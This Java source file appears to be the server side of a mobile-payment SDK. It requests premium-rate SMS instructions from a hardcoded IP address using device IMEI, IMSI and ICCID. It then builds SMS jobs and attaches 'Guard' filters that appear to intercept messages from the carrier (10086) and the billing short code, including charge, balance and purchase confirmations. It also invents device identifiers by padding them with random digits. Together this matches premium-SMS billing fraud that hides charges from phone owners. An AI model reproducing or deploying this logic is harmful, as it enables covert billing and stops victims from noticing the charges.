package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 1.请求短信接口
以get方式请求我方接口：http://211.99.195.154:8181/hfb.aspx
   参数规范及示例如下：    
参数	说明
ua	手机型号（品牌-型号）如：huawei-610,若获取不到，可传空
os	安卓系统版本,如：4.2,若获取不到，可传空
imei	IMEI
imsi	IMSI
iccid	ICCID
amount	资费（分）
orderid	订单号（不能重复）, 此参数可选,若选择此参数，则值不能重复
cid	渠道编号（由商务分配）
示例：
   http://211.99.195.154:8181/hfb.aspx?ua=huawei-610&os=4.2&imei=860623023037516&imsi=460013188013982&iccid=89860111083020139161&cid=xxxx&amount=200&orderid=14078787819


2.接口响应消息
	请求接口后返回JSON格式数据：
     {"isDirectPay":"1","mo1Called":"1065800810155979","mo2Called":"10658008295979517172","mo1Msg":"020#14078787818#20140610#95979517172","amount":"200","mo2Msg":"8"}
参数	说明
isDirectPay	需发送短信的条数
Mo1Called	短信1上行端口
Mo2Called	短信1上行内容
Mo1Msg	短信2上行端口
Mo2Msg	短信2上行内容
amount	资费（分）

	第一步：发送mo1Called到mo1Msg
	mo1Called:上行端口
	mo1Msg:上行内容
	第二步：发送mo2Called到mo2Msg
	mo2Called: 上行端口
	mo2Msg:上行内容
	
isDirectPay=1，只需完成第1步操作（发送1条信息）；isDirectPay=0则在完成第一步后，继续第2步的操作（发送2条信息）
 * @author leoliu
 *
 */
public class ZztRmDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(ZztRmDynamicService.class);
	private static final String TYPE = "zztrm";
	private static final String URLPARAM = "imei={imei}&imsi={imsi}&cpparam={cpparam}&iccid={iccid}&ua={ua}&video_ua={video_ua}";
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658008", "无法|稍后|有误|请核对", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658008","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658008","感谢购买|享乐游元宝",2880,"1",0);
	private static final Guard guard7 = new Guard("10658008","内容服务商901525|发送信息费",2880,"0",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658008","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private boolean test = false;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
//		if(!test){
////			return DynamicUtils.parseError("598");
//		}
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = URLPARAM.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = imei.replaceAll("[a-zA-Z]","1");
			
			imei = fillImei(imei);
			
			param = param.replace("{imei}", imei);
			
			String iccid = StringUtils.defaultString(map.get("iccid"));
			
			if(iccid.length() <= 1){
				iccid = "898600";
			}
			
			param = param.replace("{iccid}", iccid);
			
			param = param.replace("{amount}", StringUtils.defaultString(map.get("amount")));
			param = param.replace("{cid}", StringUtils.defaultString(map.get("cid")));
			
			String responseXml = GetData.getData(url+"?"+param);
			
			if(responseXml != null && responseXml.length() > 0){
				xml = parseXml(map,responseXml);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String json){
		
		try {
			JSONObject jo = new JSONObject(json);
		
			if(jo.has("isDirectPay")){
				tryMap.remove(map.get("mobileId"));
				
				String isDirectPay = jo.getString("isDirectPay");
			
				String mo1Called = jo.getString("mo1Called");
				
				String mo2Called = jo.getString("mo2Called");
				
				String mo1Msg = jo.getString("mo1Msg");
				
				String mo2Msg = jo.getString("mo2Msg");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(mo1Msg);
				sms.setSmsDest(mo1Called);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				if("0".equals(isDirectPay)){
					Sms sms1 = new Sms();
					
					sms1.setSmsContent(mo2Msg);
					sms1.setSmsDest(mo2Called);
					sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms1);
				}
				
				Sms guardSms = new Sms();
							
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
						
				guardList.add(guard6);
				guardList.add(guard7);
				guardList.add(guard3);
				guardList.add(guard4);
				guardList.add(guard5);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		
		tryMap.remove(map.get("mobileId"));
		return DynamicUtils.parseError("597");
	}

	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}
}
